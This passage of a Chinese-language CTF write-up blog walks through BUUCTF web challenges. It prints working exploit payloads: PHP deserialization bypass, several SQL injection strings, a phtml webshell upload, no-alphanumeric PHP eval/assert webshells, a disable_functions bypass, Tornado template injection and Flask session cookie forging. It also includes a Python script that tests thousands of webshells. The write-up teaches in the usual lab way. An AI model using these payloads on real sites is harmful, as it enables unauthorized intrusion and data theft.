class=\"number\">100</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">\"&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;\"</span>;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">\"You name is: \"</span>;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"keyword\">$this</span>-&gt;username;<span class=\"keyword\">echo</span> <span class=\"string\">\"&lt;/br&gt;\"</span>;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">\"You password is: \"</span>;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"keyword\">$this</span>-&gt;password;<span class=\"keyword\">echo</span> <span class=\"string\">\"&lt;/br&gt;\"</span>;</span><br><span class=\"line\">            <span class=\"keyword\">die</span>();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"keyword\">$this</span>-&gt;username === <span class=\"string\">'admin'</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">global</span> $flag;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> $flag;</span><br><span class=\"line\">        &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">\"&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can't give you the flag!\"</span>;</span><br><span class=\"line\">            <span class=\"keyword\">die</span>();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><br>很简单的反序列化，username为admin且password为100即可getflag，只需要绕过一下wakeup函数即可<br><figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Name</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> $username = <span class=\"string\">'nonono'</span>;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> $password = <span class=\"string\">'yesyes'</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span><span class=\"params\">($username,$password)</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;username = $username;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;password = $password;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$obj = <span class=\"keyword\">new</span> Name(<span class=\"string\">'admin'</span>,<span class=\"number\">100</span>);</span><br><span class=\"line\">$obj = serialize($obj);</span><br><span class=\"line\">$obj = str_replace(<span class=\"string\">':2:'</span>, <span class=\"string\">':3:'</span>, $obj);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> urlencode($obj);</span><br></pre></td></tr></table></figure><br>payload:<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">O%3A4%3A%22Name%22%3A3%3A%7Bs%3A14%3A%22%00Name%00username%22%3Bs%3A5%3A%22admin%22%3Bs%3A14%3A%22%00Name%00password%22%3Bi%3A100%3B%7D</span><br></pre></td></tr></table></figure></p>\n<h1 id=\"极客大挑战-2019-Knife\"><a href=\"#极客大挑战-2019-Knife\" class=\"headerlink\" title=\"[极客大挑战 2019]Knife\"></a>[极客大挑战 2019]Knife</h1><p>题目直接给出了shell<code>eval($_POST[&quot;Syc&quot;]);</code><br>然后直接读flag就行了<br><img src=\"/2020/04/02/buuctf/22.png\" alt></p>\n<h1 id=\"极客大挑战-2019-LoveSQL\"><a href=\"#极客大挑战-2019-LoveSQL\" class=\"headerlink\" title=\"[极客大挑战 2019]LoveSQL\"></a>[极客大挑战 2019]LoveSQL</h1><p>题目毫无过滤，直接一把梭就行了，payload如下：<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">view-source:http:&#x2F;&#x2F;4616398c-abd6-4030-87b8-27d8abd6fd4c.node3.buuoj.cn&#x2F;check.php?username&#x3D;adin%27union%20select%201,(select%20group_concat(password)%20from%20l0ve1ysq1),3%23&amp;password&#x3D;addmin</span><br></pre></td></tr></table></figure></p>\n<h1 id=\"极客大挑战-2019-Http\"><a href=\"#极客大挑战-2019-Http\" class=\"headerlink\" title=\"[极客大挑战 2019]Http\"></a>[极客大挑战 2019]Http</h1><p>修改指定http头即可<br><img src=\"/2020/04/02/buuctf/23.png\" alt></p>\n<h1 id=\"极客大挑战-2019-BabySQL\"><a href=\"#极客大挑战-2019-BabySQL\" class=\"headerlink\" title=\"[极客大挑战 2019]BabySQL\"></a>[极客大挑战 2019]BabySQL</h1><p>过滤了or,and,from,union,select,where等字符，可以通过双写绕过，payload<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">view-source:http:&#x2F;&#x2F;39ae0ce7-baa4-43ed-9adf-df019b95a001.node3.buuoj.cn&#x2F;check.php?username&#x3D;0&#39; uniunionon seselectlect 1,(seleselectct group_concat(passwoorrd) frfromom b4bsql),3-- +&amp;password&#x3D;456</span><br></pre></td></tr></table></figure></p>\n<h1 id=\"极客大挑战-2019-BuyFlag\"><a href=\"#极客大挑战-2019-BuyFlag\" class=\"headerlink\" title=\"[极客大挑战 2019]BuyFlag\"></a>[极客大挑战 2019]BuyFlag</h1><p>题目Attention给出提示</p>\n<blockquote>\n<p>If you want to buy the FLAG:<br>You must be a student from CUIT!!!<br>You must be answer the correct password!!!</p>\n</blockquote>\n<p>同时view-source存在源码<br><figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;!--</span><br><span class=\"line\">    ~~~post money <span class=\"keyword\">and</span> password~~~</span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>($_POST[<span class=\"string\">'password'</span>])) &#123;</span><br><span class=\"line\">    $password = $_POST[<span class=\"string\">'password'</span>];</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (is_numeric($password)) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">\"password can't be number&lt;/br&gt;\"</span>;</span><br><span class=\"line\">    &#125;<span class=\"keyword\">elseif</span> ($password == <span class=\"number\">404</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">\"Password Right!&lt;/br&gt;\"</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">--&gt;</span><br></pre></td></tr></table></figure><br>也就是说，得到flag需要达到三个条件</p>\n<ol>\n<li>是CUIT’s student</li>\n<li>正确的密码</li>\n<li>足够的money</li>\n</ol>\n<p>查看返回头可以看到存在cookie<code>user=0</code>，猜测可能是身份鉴别字段，修改值为1，这样就通过了CUIT的验证</p>\n<blockquote>\n<p>you are Cuiter<br>Please input your password!!</p>\n</blockquote>\n<p>password字段的验证绕过很简单，<code>is_numeric</code>存在截断漏洞，提交<code>password=404%00aaa</code>即可绕过</p>\n<blockquote>\n<p>you are Cuiter<br>Password Right!<br>Pay for the flag!!!hacker!!!</p>\n</blockquote>\n<p>然后提交金额100000000</p>\n<blockquote>\n<p>you are Cuiter<br>Password Right!<br>Nember lenth is too long</p>\n</blockquote>\n<p>数字过长可以使用科学计数法，提交<code>money=1e9</code>即可getflag</p>\n<h1 id=\"极客大挑战-2019-Upload\"><a href=\"#极客大挑战-2019-Upload\" class=\"headerlink\" title=\"[极客大挑战 2019]Upload\"></a>[极客大挑战 2019]Upload</h1><p>很简单的上传绕过，需要修改三个点</p>\n<ol>\n<li>content-type: image/jpeg</li>\n<li>修改文件后缀名为phtml</li>\n<li>添加图片前缀<code>GIF89a</code></li>\n<li>使用标签<code>&lt;script language=&quot;php&quot;&gt;&lt;/script&gt;</code></li>\n</ol>\n<p><img src=\"/2020/04/02/buuctf/24.png\" alt></p>\n<p>上传成功后需要猜测上传目录，实际上传目录为<code>upload</code><br>getflag payload：<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:&#x2F;&#x2F;2625763a-f599-4a0b-a1c7-1f9501ab20d2.node3.buuoj.cn&#x2F;upload&#x2F;shell.phtml?snow&#x3D;system(%27cat%20&#x2F;flag%27);</span><br></pre></td></tr></table></figure></p>\n<h1 id=\"极客大挑战-2019-HardSQL\"><a href=\"#极客大挑战-2019-HardSQL\" class=\"headerlink\" title=\"[极客大挑战 2019]HardSQL\"></a>[极客大挑战 2019]HardSQL</h1><p>报错注入，过滤了空格，可以使用括号包裹绕过，<code>=&lt;&gt;</code>也被过滤了，可以使用<code>in</code>语句来绕过<br>爆表<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:&#x2F;&#x2F;398e34ad-ff1a-4090-80c3-7917a9249043.node3.buuoj.cn&#x2F;check.php?username&#x3D;admin&#39;^(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)in(select(database()))),0x7e),1))%23&amp;password&#x3D;admin</span><br></pre></td></tr></table></figure></p>\n<blockquote>\n<p>H4rDsq1</p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:&#x2F;&#x2F;398e34ad-ff1a-4090-80c3-7917a9249043.node3.buuoj.cn&#x2F;check.php?username&#x3D;admin&#39;^(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)in(select(&#39;H4rDsq1&#39;))),0x7e),1))%23&amp;password&#x3D;admin</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>XPATH syntax error: ‘~id,username,password~‘</p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:&#x2F;&#x2F;398e34ad-ff1a-4090-80c3-7917a9249043.node3.buuoj.cn&#x2F;check.php?username&#x3D;admin&#39;^(updatexml(1,concat(0x7e,(select(left(password,31))from(H4rDsq1)),0x7e),1))%23&amp;password&#x3D;admin</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>XPATH syntax error: ‘~flag{7ba38da2-8bbb-4d78-9c9d-6a’</p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:&#x2F;&#x2F;398e34ad-ff1a-4090-80c3-7917a9249043.node3.buuoj.cn&#x2F;check.php?username&#x3D;admin&#39;^(updatexml(1,concat(0x7e,(select(right(password,31))from(H4rDsq1)),0x7e),1))%23&amp;password&#x3D;admin</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>XPATH syntax error: ‘~a2-8bbb-4d78-9c9d-6abe9bc51c29}’</p>\n</blockquote>\n<h1 id=\"极客大挑战-2019-RCE-ME\"><a href=\"#极客大挑战-2019-RCE-ME\" class=\"headerlink\" title=\"[极客大挑战 2019]RCE ME\"></a>[极客大挑战 2019]RCE ME</h1><p>考察命令执行，题目给出了代码<br><figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">error_reporting(<span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>($_GET[<span class=\"string\">'code'</span>]))&#123;</span><br><span class=\"line\">    $code=$_GET[<span class=\"string\">'code'</span>];</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(strlen($code)&gt;<span class=\"number\">40</span>)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">\"This is too Long.\"</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(preg_match(<span class=\"string\">\"/[A-Za-z0-9]+/\"</span>,$code))&#123;</span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">\"NO.\"</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    @<span class=\"keyword\">eval</span>($code);</span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    highlight_file(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><br>参考P神的一篇博文<a href=\"https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html\" target=\"_blank\" rel=\"noopener\">无字母数字shell提高篇</a>中提到一种方法，在PHP7中，可以使用<code>($a)()</code>来执行代码，比如使用<code>(&#39;phpinfo&#39;)()</code>可以执行phpinfo函数<br><figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">php7 -r <span class=\"string\">\"('phpinfo')();\"</span></span><br></pre></td></tr></table></figure><br>运行该命令可以看到成功打印PHP信息，不过在版本小于PHP7时是不可以的<br>由于不允许出现数字字母，我们需要设法表示字母，可以使用<code>~</code>来实现，比如<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">php7 -r &quot;echo urlencode(~&#39;phpinfo&#39;);&quot;  # 为了避免字符显示问题，所以进行了url编码</span><br></pre></td></tr></table></figure><br>然后运行<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">php7 -r &quot;(~urldecode(&#39;%8F%97%8F%96%91%99%90&#39;))();&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">phpinfo()</span><br><span class=\"line\">PHP Version &#x3D;&gt; 7.0.12</span><br><span class=\"line\"></span><br><span class=\"line\">System &#x3D;&gt; Windows NT DESKTOP-S4PD6MS 10.0 build 17763 (Windows 10) i586</span><br><span class=\"line\">Build Date &#x3D;&gt; Oct 13 2016 10:44:50</span><br><span class=\"line\">Compiler &#x3D;&gt; MSVC14 (Visual C++ 2015)</span><br><span class=\"line\">Architecture &#x3D;&gt; x86</span><br></pre></td></tr></table></figure><br>可以看到是可以运行的，提交该payload，可以看到phpinfo()执行结果，查看disable_functions选项<br><img src=\"/2020/04/02/buuctf/25.png\" alt><br>常用命令执行函数被ban了，可以使用<code>var_dump+scandir+file_get_contents</code>组合拳来读取文件<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">➜ php7 -r &quot;echo urlencode(~&#39;var_dump&#39;);&quot;</span><br><span class=\"line\">%89%9E%8D%A0%9B%8A%92%8F</span><br><span class=\"line\">➜ php7 -r &quot;echo urlencode(~&#39;scandir&#39;);&quot;</span><br><span class=\"line\">%8C%9C%9E%91%9B%96%8D</span><br></pre></td></tr></table></figure><br>payload为<code>(~%89%9E%8D%A0%9B%8A%92%8F)((~%8C%9C%9E%91%9B%96%8D)(%27/%27));</code>，相当于执行了<code>var_dump(scandir(&#39;/&#39;));</code><br><img src=\"/2020/04/02/buuctf/26.png\" alt><br>但是，接下来读取文件时却无法读取，应该是没有相应的权限，根目录下还有一个readflag文件，应该是要调用该程序读取flag<br>这样的话需要我们进行绕过disable_functions进行提权，我们先尝试获取一个webshell</p>\n<p>查看disable_functions可以看到<code>assert</code>没有被ban，可以尝试利用之<br>官方文档中说，php7+版本中，assert不再作为函数而是作为一种语言结构，而且默认不能执行代码，不过，使用间接调用的方法却是可以当做函数执行的（不知道为啥），比如：<br><figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">assert(var_dump(<span class=\"string\">'aaa'</span>));</span><br></pre></td></tr></table></figure><br>该语句执行时无任何返回，我们使用间接的方式来执行：<br><figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">$a = <span class=\"string\">'assert'</span>;</span><br><span class=\"line\">$a(var_dump(<span class=\"string\">'aaa'</span>));</span><br></pre></td></tr></table></figure></p>\n<blockquote>\n<p>string(3) “aaa”<br>PHP Warning:  assert(): Assertion failed in /var/www/html/rce.php on line 4</p>\n</blockquote>\n<p>此时成功执行</p>\n<p>那么，我们就用此方法来getshell，payload如下：<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">code&#x3D;$&#123;~(%A0%B8%BA%AB)&#125;[_]($&#123;~(%A0%B8%BA%AB)&#125;[__]);&amp;_&#x3D;assert&amp;__&#x3D;eval($_POST[___]);</span><br></pre></td></tr></table></figure><br><img src=\"/2020/04/02/buuctf/27.png\" alt><br>然后使用蚁剑连接，蚁剑中正好有绕过disable_funcs的插件，直接用一下<br><img src=\"/2020/04/02/buuctf/28.png\" alt><br>提权之后读flag<br><img src=\"/2020/04/02/buuctf/28.png\" alt></p>\n<p>PS：根据出题大佬的原意，第一步的getshell是希望我们实现无文件getshell，并且给出了payload<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">?code&#x3D;(~%9E%8C%8C%9A%8D%8B)((~%91%9A%87%8B)((~%98%9A%8B%9E%93%93%97%9A%9E%9B%9A%8D%8C)()));</span><br><span class=\"line\">&#x2F;&#x2F;(&quot;assert&quot;)((&quot;next&quot;)((&quot;getallheaders&quot;)()));</span><br></pre></td></tr></table></figure><br>然后通过UA头即可执行任意命令</p>\n<hr>\n<h1 id=\"PHP语言结构（language-construct）：\"><a href=\"#PHP语言结构（language-construct）：\" class=\"headerlink\" title=\"PHP语言结构（language construct）：\"></a>PHP语言结构（language construct）：</h1><p><strong>语言结构与函数相比的一些特征：</strong></p>\n<ol>\n<li>很多不需要括号，有的会需要</li>\n<li>一些语言结构，能够实现一些函数不可能完成的事情，比如isset，经常会访问一下不存在的变量，如果使用函数来实现会非常难;</li>\n<li>一些语言结构与函数写法存在差异。例如，Array(…)结构可以写成[…]</li>\n<li>正如文档不断提醒我们的，<strong>语言结构不能作为可变函数引用</strong>。即<code>$a=&#39;print_r&#39;; $a(…);</code>是可以的，而<code>$a=&#39;print&#39;;$a(…);</code>则不行，因为print_r是函数，而print是语言结构</li>\n</ol>\n<h1 id=\"护网杯-2018-easy-tornado\"><a href=\"#护网杯-2018-easy-tornado\" class=\"headerlink\" title=\"[护网杯 2018]easy_tornado\"></a>[护网杯 2018]easy_tornado</h1><p>python模板注入题目，查看hint.txt可知题目需要知道文件名与签名，flag.txt中已给出了flag位置<code>/fllllllllllllag</code>，签名格式为</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">md5(cookie_secret+md5(filename))</span><br></pre></td></tr></table></figure>\n<p>所以此题目标就是要获取<code>cookie_secret</code>值，当签名错误后会报错，此报错页面存在模板注入</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:&#x2F;&#x2F;c031cfdc-f167-430e-858a-52ddf7406018.node3.buuoj.cn&#x2F;error?msg&#x3D;Error</span><br></pre></td></tr></table></figure>\n<p>简单测试</p>\n<p><img src=\"/2020/04/02/buuctf/1.png\" alt></p>\n<p>通过hander对象来进行注入可以得到cookie</p>\n<p><img src=\"/2020/04/02/buuctf/2.png\" alt></p>\n<p>然后计算签名获得flag</p>\n<p><img src=\"/2020/04/02/buuctf/3.png\" alt></p>\n<h1 id=\"SUCTF-2019-EasySQL\"><a href=\"#SUCTF-2019-EasySQL\" class=\"headerlink\" title=\"[SUCTF 2019]EasySQL\"></a>[SUCTF 2019]EasySQL</h1><p>本题是数字型注入，测试过滤</p>\n<p><img src=\"/2020/04/02/buuctf/4.png\" alt></p>\n<p>发现题目可以进行堆叠注入，本来想利用<code>execute</code>来执行语句，但是过滤了prepare，根据探测发现目标表名为<code>Flag</code></p>\n<p><img src=\"/2020/04/02/buuctf/5.png\" alt></p>\n<p>但是flag被过滤了，<code>from</code>字段也没法用，这里做到这儿就没思路了，查看资料发现解法是设置sql_mode，真的学到了</p>\n<p>本题需要猜测后端的SQL语句，当输入0无数据返回，输入1会返回数据，所以后端可能是存在异或的</p>\n<p><img src=\"/2020/04/02/buuctf/6.png\" alt></p>\n<p>后端sql语句可能是</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">$sql = <span class=\"string\">\"select \"</span>.$query.<span class=\"string\">\"||flag from Flag\"</span>;</span><br></pre></td></tr></table></figure>\n<p>所以我们直接输入<code>*,1</code>也可以得到flag</p>\n<p>除此之外，官方解法还可以通过设置sql_mode来解决，将<code>||</code>变为类似Oracle的管道连接符</p>\n<p><img src=\"/2020/04/02/buuctf/7.png\" alt></p>\n<p>payload如下：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">1;<span class=\"keyword\">set</span> sql_mode=pipes_as_concat;<span class=\"keyword\">select</span> <span class=\"number\">1</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"/2020/04/02/buuctf/8.png\" alt></p>\n<h1 id=\"HCTF-2018-admin\"><a href=\"#HCTF-2018-admin\" class=\"headerlink\" title=\"[HCTF 2018]admin\"></a>[HCTF 2018]admin</h1><p>查看源代码发现提示信息</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;!-- you are not admin --&gt;</span><br></pre></td></tr></table></figure>\n<p>需要我们以admin身份登录，浏览之后发现有注册功能，随便注册一个账号，登录之后看到存在cookie，应该是要伪造cookie，查看cookie格式应该是flask下的cookie，那么伪造的话我们需要获得secret_key，尝试了模板注入没有发现，最终在change页面发现源代码地址</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;!-- https:&#x2F;&#x2F;github.com&#x2F;woadsl1234&#x2F;hctf_flask&#x2F; --&gt;</span><br></pre></td></tr></table></figure>\n<p>查看源代码可以得知secret_key为<code>ckj123</code></p>\n<p>然后就是正常的cookie伪造</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">py .\\flask_session_cookie_manager3.py decode -c &#39;.eJxNkMGKwjAURX9lyNpFmupGcFGJU1J4L1QyE_I2MqNVm1iFVqmN-O9TXc32wD1w7oNt9m3VHdn82t6qCdvUOzZ_sI9fNmeYlz0ZFUGGQRvHtVwJyt0dPQiwVKOFAeUhYoRE23Xj7GpAQQGN4mi_j-iXwfml11IJZ4sa5WtbnJxQA8QiUL7i2mScbJmO3imZLCVTBJQZd2JdYwMJCDUDW5wo_xy5SsGXXOcYyGCjbdmjD_dxu2DPCdt27X5zvYTq_C9h1PqQogHuouqd30b0B06-nGq5q1-cJAiyX2OKmrkIUzos3rrzT1ONiu586dmE3bqqfZ_DEs6ef_NiYyk.XkThtA.0N3JaixDVMTckrVyXBvrmGo7sgI&#39; -s &#39;ckj123&#39;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">py .\\flask_session_cookie_manager3.py encode -t &quot;&#123;&#39;_fresh&#39;: True, &#39;_id&#39;: b&#39;4d0e23092964816df16361fb5c24837359dfaa27fd5245ea60db0c826abb46162ecb232dda4904ed7df8e07e2d404cdb6c53b91bedad4272448cde3f9d0691df&#39;, &#39;csrf_token&#39;: b&#39;4f8f97534c20b73684f4887b534d36ee2429c38f&#39;, &#39;name&#39;: &#39;admin&#39;, &#39;user_id&#39;: &#39;1&#39;&#125;&quot; -s &quot;ckj123&quot;</span><br></pre></td></tr></table></figure>\n<p>可以得到cookie</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">.eJxNkMGKwjAURX9leGsXMdWN4EKJU1J4L1QyE_I24mjVJtaBqmgj_vtUV7M9cA-c-4DVrq3OB5hc2ms1gFW9hckDPn5gApSXN7Y6oYqdsV4YtZCc-zsFlOi4JocdqX2ihEPjlo13i44kR7JakPs-UJhHH-bBKC29K2pSr21x9FJ3mIrI-UIYOxPsyqz3jtjOMrZFJDUTXi5ranCIUo_RFUfOP3uuMwylMDlFttQYV94oxHu_ncJzAJtzu1tdfmN1-pfQa0PMyKLwSd982CQKe8GhHBm1rV-cFUp2X32KHvuEI95P37rTuql6xXrb1CcYwPVcte93YAjPP_KyYzs.XkTsFA.YOebiET5QoqNJ-EXRqMFRBrKHg8</span><br></pre></td></tr></table></figure>\n<p><img src=\"/2020/04/02/buuctf/9.png\" alt></p>\n<hr>\n<p>本题还有其它解法</p>\n<p><strong>方法二：</strong></p>\n<p>pass</p>\n<h1 id=\"强网杯-2019-高明的黑客\"><a href=\"#强网杯-2019-高明的黑客\" class=\"headerlink\" title=\"[强网杯 2019]高明的黑客\"></a>[强网杯 2019]高明的黑客</h1><p>题目直接给出了源码，下载之后是三千多个shell，但是大部分都不能用，需要找出能够使用的，方法是通过匹配<code>$_POST</code>或<code>$_GET</code>来执行命令，这里可以使用<code>echo</code>命令，因为该命令既在PHP下可以执行，在shell条件下也可以执行，此外，如果一个一个试的话速度会非常慢，我们需要使用多线程来增加速度，代码如下</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\"><span class=\"keyword\">import</span> multiprocessing <span class=\"keyword\">as</span> mp</span><br><span class=\"line\"></span><br><span class=\"line\">url = <span class=\"string\">'http://192.168.75.144/'</span></span><br><span class=\"line\">flag = <span class=\"number\">1</span>  <span class=\"comment\"># 在得到可用shell之后退出线程</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">test_shell</span><span class=\"params\">(filename)</span>:</span></span><br><span class=\"line\">    <span class=\"keyword\">global</span> flag</span><br><span class=\"line\">    <span class=\"keyword\">if</span> flag:</span><br><span class=\"line\">        command = <span class=\"string\">\"echo 'aesm1p';\"</span></span><br><span class=\"line\">        <span class=\"keyword\">with</span> open(filename) <span class=\"keyword\">as</span> f:</span><br><span class=\"line\">            cont = f.read()</span><br><span class=\"line\">            <span class=\"comment\"># POST</span></span><br><span class=\"line\">            catches = re.findall(<span class=\"string\">r\"\\$_POST\\['(\\S+)'\\]\"</span>, cont)</span><br><span class=\"line\">            <span class=\"keyword\">for</span> para <span class=\"keyword\">in</span> catches:</span><br><span class=\"line\">                data = &#123;para: command&#125;</span><br><span class=\"line\">                res = requests.post(url+filename, data=data).content.decode(<span class=\"string\">'utf-8'</span>)</span><br><span class=\"line\">                <span class=\"keyword\">if</span> <span class=\"string\">'aesm1p'</span> <span class=\"keyword\">in</span> res:</span><br><span class=\"line\">                    flag = <span class=\"number\">0</span></span><br><span class=\"line\">                    print(<span class=\"string\">'Success! url is &#123;&#125;. payload: &#123;&#125;'</span>.format(url + filename, para))</span><br><span class=\"line\">                    <span class=\"keyword\">break</span></span><br><span class=\"line\">            <span class=\"comment\"># GET</span></span><br><span class=\"line\">            catches = re.findall(<span class=\"string\">r\"\\$_GET\\['(\\S+)'\\]\"</span>, cont)</span><br><span class=\"line\">            <span class=\"keyword\">for</span> para <span class=\"keyword\">in</span> catches:</span><br><span class=\"line\">                res = requests.get(url + filename + <span class=\"string\">'?'</span> + para + <span class=\"string\">'='</span> + command).content.decode(<span class=\"string\">'utf-8'</span>)</span><br><span class=\"line\">                <span class=\"keyword\">if</span> <span class=\"string\">'aesm1p'</span> <span class=\"keyword\">in</span> res:</span><br><span class=\"line\">                    flag = <span class=\"number\">0</span></span><br><span class=\"line\">                    print(<span class=\"string\">'Success! url is &#123;&#125;'</span>.format(url + filename + <span class=\"string\">'?'</span> + para + <span class=\"string\">'='</span> + command))</span><br><span class=\"line\">                    <span class=\"keyword\">break</span></span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"number\">0</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">0</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">'__main__'</span>:</span><br><span class=\"line\">    files = os.listdir(<span class=\"string\">'src/'</span>)</span><br><span class=\"line\">    pool = mp.Pool(processes=<span class=\"number\">30</span>)</span><br><span class=\"line\">    <span class=\"keyword\">for</span> file <span class=\"keyword\">in</span> files:</span><br><span class=\"line\">        pool.apply_async(test_shell,args = (<span class=\"string\">'src/'</span> + file,))</span><br><span class=\"line\">    pool.close()</span><br><span class=\"line\">    pool.join()</span><br></pre></td></tr></table></figure>\n<p><img src=\"/2020/04/02/buuctf/10.png\" alt></p>\n<p><img src=\"/2020/04/02/buuctf/11.png\" alt></p>\n<h1 id=\"RoarCTF-2019-Easy-Calc\"><a href=\"#RoarCTF-2019-Easy-Calc\" class=\"headerlink\" title=\"[RoarCTF 2019]Easy Calc\"></a>[RoarCTF 2019]Easy Calc</h1><p>本题考点是php的字符串解析特性</p>\n<p>PHP在将查询字符串（在URL中或者在正文中）转化为<code>$_GET</code>或<code>$_POST</code>数组时，会将一些字符删除或用下划线替代，它在解析时会做两件事</p>\n<blockquote>\n<ol>\n<li>删除某些空白字符</li>\n<li>将某些字符转换为下划线</li>\n</ol>\n</blockquote>\n<p>例如下面这段代码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">var_dump($_GET);</span><br><span class=\"line\">var_dump($_POST);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"/2020/04/02/buuctf/12.png\" alt></p>\n<p>可以看到，在get参数中<code>[</code>被转换成了<code>_</code>，而字段名<code>前面的空格</code>被置空，但是字段名<code>后面的空格</code>会被保留</p>\n<p>这个特性在绕过某些waf时可以用到，如某些waf对<code>user_id</code>字段有过滤，我们可以使用字段<code>user[id</code>来绕过，waf不会检测该字段，但是到了PHP后端则又会被转化为<code>user_id</code>，从而成功绕过WAF。</p>\n<hr>\n<p>本题中，查看源代码</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;!--I&#39;ve set up WAF to ensure security.--&gt;</span><br></pre></td></tr></table></figure>\n<p>给出了calc.php的代码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">error_reporting(<span 